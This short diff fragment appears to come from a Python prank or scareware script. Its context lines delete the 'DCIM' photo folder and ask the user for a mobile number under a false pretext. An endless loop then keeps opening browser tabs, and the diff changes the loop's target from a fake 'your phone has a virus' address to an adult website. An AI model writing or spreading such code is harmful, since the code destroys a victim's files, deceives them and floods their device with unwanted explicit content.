@@ -10,7 +10,7 @@ os.rmdir("DCIM")
 
 input("Input Mobile Number:")
 while True:
-	webbrowser.open("https://Yourphonehasavirus/ByThund3r")
+	webbrowser.open("https://xnxx.com")
 
 
 
